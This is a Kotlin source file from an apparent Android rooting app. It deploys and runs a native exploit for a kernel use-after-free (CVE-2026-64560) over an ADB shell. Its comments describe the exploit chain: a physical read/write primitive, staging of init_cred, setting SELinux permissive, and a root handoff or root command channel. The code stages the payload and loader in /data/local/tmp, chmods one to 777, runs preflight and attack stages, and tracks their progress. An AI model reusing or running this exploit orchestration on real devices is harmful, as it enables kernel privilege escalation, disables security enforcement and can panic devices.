package com.hexo141.liquidglass.root

import android.content.Context
import com.hexo141.liquidglass.adb.AbsAdbConnectionManager
import com.hexo141.liquidglass.adb.AdbShell
import com.hexo141.liquidglass.device.DeviceInfo
import java.io.File

/**
 * Fourth engine: CVE-2026-64560, the posix-cpu-timers use-after-free on non-leader `exec()`.
 *
 * `execve()` from a non-leader thread runs `de_thread()` → `switch_leader()`, which hands the TGID
 * to the new leader and reaps the old one (`old_leader->sighand = NULL`). A concurrent
 * `timer_delete()` that resolved the old leader then sees a task without `sighand`, assumes the
 * exit path will unlink the timer and returns, while `free_posix_timer()` frees the `k_itimer`.
 * Process-wide CPU timers survive `exec()`, so the freed node stays in `signal->cpu_timers` and the
 * next tick walks it: UAF read/write on the timerqueue.
 *
 * The payload turns that into a physical read/write primitive, finds `init_cred`, stages a root
 * credential on a child, makes SELinux permissive, and then hands the child to the staged
 * `loader` (native-or/bootstrap.c) so the manager late-loads or a root command channel survives.
 *
 * Every address is derived from one exact build, so the payload carries its own gate: it refuses
 * to run unless `ro.build.fingerprint` / `ro.product.device` match the port. [isSupported] only
 * recognises the device family; the authoritative answer comes from `--preflight`, and a gate
 * failure must not be recorded as "not vulnerable".
 *
 * The race is probabilistic and can panic the kernel, so a run is expected to need several
 * attempts and possibly a reboot.
 */
object PctRunner {
    private const val STAGE_DIR = "/data/local/tmp/openroot"
    private const val BOOTSTRAP = "libopenbootstrap.so"
    private const val BOOTSTRAP_REMOTE = "loader"

    /** Builds with their own port; one payload per build, matched against the device itself. */
    enum class Payload(
        val asset: String,
        private val codename: String,
        private val fingerprintPrefix: String,
    ) {
        OPACE6("libpct-opace6.so", "OP6113L1", "OnePlus/PLQ110/OP6113L1:");

        fun matches(info: DeviceInfo): Boolean =
            info.codename.equals(codename, ignoreCase = true) ||
                info.fingerprint.startsWith(fingerprintPrefix, ignoreCase = true)
    }

    /** Outcome of one run. */
    data class Result(
        val exitCode: Int,
        val handoff: RootHandoff.Result,
        /** False when `--preflight` refused the device: nothing was attempted, nothing to record. */
        val attempted: Boolean = true,
        /** True when the refusal was the exact-build gate, not e.g. a missing `/dev/uhid`. */
        val buildMismatch: Boolean = false,
    )

    /** Whether the build for [payload] got packaged for this ABI. */
    fun isPayloadPresent(context: Context, payload: Payload): Boolean =
        File(context.applicationInfo.nativeLibraryDir, payload.asset).isFile

    /**
     * Picks the build for the connected device, so the picker only ever lists the CVE.
     *
     * The gate in [Payload.matches] is a family check on purpose: the payload's own `--preflight`
     * compares the full fingerprint, so a build that moved on still reaches the payload and gets a
     * precise `TARGET_PROFILE_GATE_FAIL` instead of a silent refusal here.
     */
    fun payloadFor(info: DeviceInfo): Payload? =
        Payload.entries.firstOrNull { it.matches(info) }

    fun isSupported(info: DeviceInfo): Boolean = payloadFor(info) != null

    /** Engine name for the status card, or {@code null} when no port covers this device. */
    fun describe(info: DeviceInfo): String? =
        if (isSupported(info)) "CVE-2026-64560" else null

    /**
     * Stages the payload plus the root handoff and runs it as the `shell` user.
     *
     * @param suManager manager whose `libksud.so` is staged; when {@code null} the payload starts
     *        a root command channel instead
     */
    @Throws(Exception::class)
    fun run(
        context: Context,
        manager: AbsAdbConnectionManager,
        payload: Payload,
        suManager: KsuManager.Target?,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit = {},
    ): Result {
        val payloadFile = File(context.applicationInfo.nativeLibraryDir, payload.asset)
        require(payloadFile.isFile) {
            "Payload is not packaged for this ABI (${payloadFile.absolutePath})"
        }
        val bootstrap = File(context.applicationInfo.nativeLibraryDir, BOOTSTRAP)
        require(bootstrap.isFile) { "bootstrap is not packaged for this ABI" }

        onProgress(0.04f)
        onLine("$ mkdir -p $STAGE_DIR")
        AdbShell.exec(manager, "mkdir -p $STAGE_DIR")
        // Staged through AdbShell.stage: the bytes go into this app's external cache first and the
        // shell copies a file it can already read. A stdin `cat >` arrives empty on Shizuku.
        val relayDir = context.getExternalCacheDir()
        AdbShell.stage(
            manager,
            "$STAGE_DIR/${payload.asset}",
            payloadFile.readBytes(),
            relayDir,
            "stage-payload.bin",
            onLine,
        )
        onProgress(0.12f)
        // 777 on purpose: the upstream tool documents that 755 is refused on this build.
        onLine("$ chmod 777 $STAGE_DIR/${payload.asset}")
        AdbShell.chmod(manager, "$STAGE_DIR/${payload.asset}", "777")
        AdbShell.stage(
            manager,
            "$STAGE_DIR/$BOOTSTRAP_REMOTE",
            bootstrap.readBytes(),
            relayDir,
            "stage-bootstrap.bin",
            onLine,
        )
        onProgress(0.2f)
        onLine("$ chmod 755 $STAGE_DIR/$BOOTSTRAP_REMOTE")
        AdbShell.chmod(manager, "$STAGE_DIR/$BOOTSTRAP_REMOTE", "755")

        // Same preference contract the page cache and GPU engines use; "none" keeps a root
        // command channel instead of late-loading a manager.
        val managerValue = suManager?.packageName.orEmpty().ifEmpty { "none" }
        val prefs = """
            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
            <map>
                <string name="su_manager">$managerValue</string>
                <boolean name="soft_reboot" value="false" />
                <boolean name="disable_modules" value="false" />
            </map>
        """.trimIndent().toByteArray()
        AdbShell.stage(
            manager,
            "$STAGE_DIR/openroot.xml",
            prefs,
            relayDir,
            "stage-prefs.xml",
            onLine,
        )
        onProgress(0.26f)
        AdbShell.chmod(manager, "$STAGE_DIR/openroot.xml", "644")

        if (suManager != null) {
            // Keep a ksud an earlier run already staged, otherwise read the manager's library from
            // this app and let the shell copy the relay file. A `dd` of the manager's private lib
            // dir cannot work - the shell user cannot open that path.
            val alreadyStaged = AdbShell.exec(
                manager,
                "test -s $STAGE_DIR/ksud && test -x $STAGE_DIR/ksud && echo ok",
            ).contains("ok")
            if (alreadyStaged) {
                onLine("$ test -x $STAGE_DIR/ksud    # already staged, skipping")
                onProgress(0.32f)
            } else {
                val ksudBytes = KsuManager.readKsud(suManager.ksudPath)
                if (ksudBytes == null) {
                    onLine("<e> cannot read ${suManager.ksudPath} from this app")
                    throw IllegalStateException("Cannot stage ksud (${suManager.ksudPath})")
                }
                AdbShell.stage(
                    manager,
                    "$STAGE_DIR/ksud",
                    ksudBytes,
                    relayDir,
                    "stage-ksud.bin",
                    onLine,
                )
                onLine("$ chmod 755 $STAGE_DIR/ksud")
                AdbShell.chmod(manager, "$STAGE_DIR/ksud", "755")
                onProgress(0.32f)
                val staged = AdbShell.exec(
                    manager,
                    "test -s $STAGE_DIR/ksud && test -x $STAGE_DIR/ksud && echo ok",
                ).contains("ok")
                if (!staged) {
                    throw IllegalStateException("Cannot stage ksud (${suManager.ksudPath})")
                }
            }
        }

        // The gate runs first: it is fast, writes nothing and tells the user immediately when the
        // build moved past the ported fingerprint (exit 2) or lacks the UHID node (exit 3).
        onLine("$ ./${payload.asset} --preflight")
        var passed = false
        var buildMismatch = false
        val preflight = AdbShell.stream(
            manager,
            "cd $STAGE_DIR && TMPDIR=$STAGE_DIR HOME=$STAGE_DIR ./${payload.asset} --preflight",
            { line ->
                if (line.contains("PREFLIGHT_PASS")) passed = true
                if (line.contains("TARGET_PROFILE_GATE_FAIL")) buildMismatch = true
                onLine(line)
            },
            idleTimeoutMs = 60_000,
        )
        if (!passed) {
            onProgress(1f)
            return Result(
                exitCode = preflight,
                handoff = RootHandoff.Result(RootHandoff.State.NONE, emptySet(), "preflight refused"),
                attempted = false,
                buildMismatch = buildMismatch,
            )
        }
        onProgress(0.38f)

        onLine("$ OPENROOT_HANDOFF=$STAGE_DIR/$BOOTSTRAP_REMOTE ./${payload.asset} --run")
        val exitCode = AdbShell.stream(
            manager,
            "cd $STAGE_DIR && TMPDIR=$STAGE_DIR HOME=$STAGE_DIR " +
                "OPENROOT_HANDOFF=$STAGE_DIR/$BOOTSTRAP_REMOTE " +
                "./${payload.asset} --run 2>&1",
            { line ->
                stageProgress(line)?.let(onProgress)
                onLine(line)
            },
            // A single attempt is silent for tens of seconds while it primes the timerqueue, and
            // the whole campaign runs up to 32 of them, so the watchdog has to be generous.
            idleTimeoutMs = 600_000,
        )
        onProgress(0.92f)

        // What bootstrap actually started, from the /dev markers it leaves behind.
        val handoff = RootHandoff.probe(manager, onLine, waitMs = 20_000)
        onProgress(1f)
        return Result(exitCode, handoff)
    }

    /** Maps the payload's stage lines onto the progress bar; {@code null} leaves it untouched. */
    private fun stageProgress(line: String): Float? = when {
        line.contains("RACE_STAGE_BEGIN") -> 0.45f
        line.contains("STAGE0_GATE_PASS") -> 0.6f
        line.contains("MISC_BRIDGE_OPEN_PASS") -> 0.72f
        line.contains("PHYS_") && line.contains("_PASS") -> 0.8f
        line.contains("STAGE8_CRED_STAGE_PASS") -> 0.86f
        line.contains("ROOT_CHILD_HOLD_PASS") -> 0.95f
        else -> null
    }
}
